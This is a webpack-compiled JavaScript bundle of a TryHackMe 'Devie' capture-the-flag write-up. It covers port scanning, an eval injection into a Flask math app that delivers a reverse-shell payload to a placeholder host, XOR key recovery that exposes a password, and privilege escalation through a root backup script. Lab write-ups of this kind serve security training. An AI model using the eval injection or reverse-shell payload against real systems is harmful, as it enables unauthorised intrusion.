"use strict";(self.webpackChunk_2h3ph3rd_github_io=self.webpackChunk_2h3ph3rd_github_io||[]).push([[7057],{99962:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>a,contentTitle:()=>c,default:()=>h,frontMatter:()=>i,metadata:()=>o,toc:()=>d});var s=t(74848),r=t(28453);const i={},c="Devie",o={id:"writeups/thm/devie/index",title:"Devie",description:"A writeup for the room Devie on TryHackMe.",source:"@site/docs/writeups/thm/devie/index.md",sourceDirName:"writeups/thm/devie",slug:"/writeups/thm/devie/",permalink:"/docs/writeups/thm/devie/",draft:!1,unlisted:!1,editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/writeups/thm/devie/index.md",tags:[],version:"current",frontMatter:{},sidebar:"writeupsSidebar",previous:{title:"Crylo",permalink:"/docs/writeups/thm/crylo/"},next:{title:"Dreaming",permalink:"/docs/writeups/thm/dreaming/"}},a={},d=[{value:"Scanning",id:"scanning",level:3},{value:"First flag",id:"first-flag",level:3},{value:"Second flag",id:"second-flag",level:3},{value:"Third flag",id:"third-flag",level:3}];function l(e){const n={a:"a",blockquote:"blockquote",code:"code",h1:"h1",h3:"h3",p:"p",pre:"pre",...(0,r.R)(),...e.components},{Image:i}=n;return i||function(e,n){throw new Error("Expected "+(n?"component":"object")+" `"+e+"` to be defined: you likely forgot to import, pass, or provide it.")}("Image",!0),(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(n.h1,{id:"devie",children:"Devie"}),"\n",(0,s.jsxs)(n.p,{children:["A writeup for the room ",(0,s.jsx)(n.a,{href:"https://tryhackme.com/room/devie",children:"Devie"})," on TryHackMe."]}),"\n",(0,s.jsxs)(n.blockquote,{children:["\n",(0,s.jsx)(n.p,{children:"A developer has asked you to do a vulnerability check on their system."}),"\n"]}),"\n",(0,s.jsx)(i,{src:t(66022).A,height:"256"}),"\n",(0,s.jsx)(n.h3,{id:"scanning",children:"Scanning"}),"\n",(0,s.jsx)(n.p,{children:"It is possible to start by scanning the machine for open ports with nmap."}),"\n",(0,s.jsx)(n.p,{children:"There are only the 22 port for SSH and 5000."}),"\n",(0,s.jsx)(i,{src:t(18831).A}),"\n",(0,s.jsx)(n.p,{children:"By connecting to the port 5000 with the browser we can find a web application.\nThe website allows to do different math calculations."}),"\n",(0,s.jsx)(i,{src:t(31956).A}),"\n",(0,s.jsx)(n.p,{children:"In the footer of the page is possible to download the source code."}),"\n",(0,s.jsx)(n.h3,{id:"first-flag",children:"First flag"}),"\n",(0,s.jsx)(n.p,{children:"By looking careful to the code we can see a vulnerability in the eval function with user input. There is no sanitation, it only checks that the values given are string."}),"\n",(0,s.jsx)(i,{src:t(75198).A}),"\n",(0,s.jsx)(n.p,{children:"We can try to obtain a reverse shell by using a custom payload."}),"\n",(0,s.jsx)(n.p,{children:"For example:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-py",children:"__import__('os').system('bash -c \\'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1\\'')#\n"})}),"\n",(0,s.jsx)(n.p,{children:"Substitute the IP and the port.\nOn your machine run:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-sh",children:"nc -nvlp <PORT>\n"})}),"\n",(0,s.jsxs)(n.p,{children:["Once inside the machine, the first flag is in the home folder of the user: ",(0,s.jsx)(n.code,{children:"THM{Car3ful_witH_3v@l}"}),"."]}),"\n",(0,s.jsx)(i,{src:t(2512).A}),"\n",(0,s.jsx)(n.h3,{id:"second-flag",children:"Second flag"}),"\n",(0,s.jsx)(n.p,{children:"In the home folder of the user (Bruce) we can find a note with this content:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"Hello Bruce,\n\nI have encoded my password using the super secure XOR format.\n\nI made the key quite lengthy and spiced it up with some base64 at the end to make it even more secure. I'll share the decoding script for it soon. However, you can use my script located in the /opt/ directory.\n\nFor now look at this super secure string:\nNEUEDTIeN1MRDg5K\n\nGordon\n"})}),"\n",(0,s.jsxs)(n.p,{children:["The encryption process is ",(0,s.jsx)(n.code,{children:"encode_base64(cleartext ^ key) = ciphertext"})]}),"\n",(0,s.jsx)(n.p,{children:"We can encrypt a simple message like a very long list of duplicated 'a'.\nIn this way it is possible to calculate the key."}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.code,{children:"decode_base64(ciphertext) = ciphertext = cleartex ^ key -> cleartex ^ key ^ cleartext = key"})}),"\n",(0,s.jsx)(i,{src:t(32382).A}),"\n",(0,s.jsx)(n.p,{children:"It is possible to write a simple Python script to decrypt easily the password."}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-py",children:'import base64\n\ncleartext = "00000000000000000000000000"\nciphertext = "Q0VAVUJDVVNCVURbVUlIX0JIX0JDRUBVQkM="\n\ndecoded = base64.b64decode(ciphertext)\n\n# Find the key value\nkey = ""\nfor i, c in enumerate(decoded):\n    # Remember c ^ cleartext = cleartex ^ key ^ cleartext = key`\n    key += chr(c ^ ord(cleartext[i]))\n\nciphertext = b"NEUEDTIeN1MRDg5K"\ndecoded = base64.b64decode(ciphertext)\n\n# Find the password value\npassword = ""\nfor i, c in enumerate(decoded):\n    # Remember c ^ key = cleartext\n    password += chr(c ^ ord(key[i]))\n\nprint(password)\n'})}),"\n",(0,s.jsxs)(n.p,{children:["By executing this script we can find the password ",(0,s.jsx)(n.code,{children:"G0th@mR0ckz!"}),".\nThe second flag is inside the home folder of the user Gordon: ",(0,s.jsx)(n.code,{children:"THM{X0R_XoR_XOr_xOr}"}),"."]}),"\n",(0,s.jsx)(i,{src:t(67915).A}),"\n",(0,s.jsx)(n.h3,{id:"third-flag",children:"Third flag"}),"\n",(0,s.jsxs)(n.p,{children:["There is a custom script called ",(0,s.jsx)(n.code,{children:"backup"})," in ",(0,s.jsx)(n.code,{children:"/usr/bin"})," that we can execute.\nIt copies everything inside the reports folder of gordon to the backups folder.\nThis action is made as root, so we can add a symlink to the root folder and make it copy also that."]}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-sh",children:"#!/bin/bash\ncd /home/gordon/reports/\ncp * /home/gordon/backups/\n"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{children:"bash -p\n"})})]})}function h(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,s.jsx)(n,{...e,children:(0,s.jsx)(l,{...e})}):l(e)}},2512:(e,n,t)=>{t.d(n,{A:()=>s});const s=t.p+"assets/images/flag1-f6a192aedf1797191f50ce25cee383d8.png"},67915:(e,n,t)=>{t.d(n,{A:()=>s});const s=t.p+"assets/images/flag2-bdc6f260da38238b91f9b46390f38be7.png"},32382:(e,n,t)=>{t.d(n,{A:()=>s});const s=t.p+"assets/images/key-008a647126a841b87433410febffc28a.png"},66022:(e,n,t)=>{t.d(n,{A:()=>s});const s=t.p+"assets/images/logo-f2e8a7dbc6b2703ed3ecddef982ae3de.png"},18831:(e,n,t)=>{t.d(n,{A:()=>s});const s=t.p+"assets/images/nmap-71045709b76abafb774e92dc4fd68fa4.png"},75198:(e,n,t)=>{t.d(n,{A:()=>s});const s=t.p+"assets/images/vuln-8d4a935d4db0f2a6a533654f6f5c5bb9.png"},31956:(e,n,t)=>{t.d(n,{A:()=>s});const s=t.p+"assets/images/website-3c95b896ec243558aaa7f8c649a0de5a.png"},28453:(e,n,t)=>{t.d(n,{R:()=>c,x:()=>o});var s=t(96540);const r={},i=s.createContext(r);function c(e){const n=s.useContext(i);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:c(e.components),s.createElement(i.Provider,{value:n},e.children)}}}]);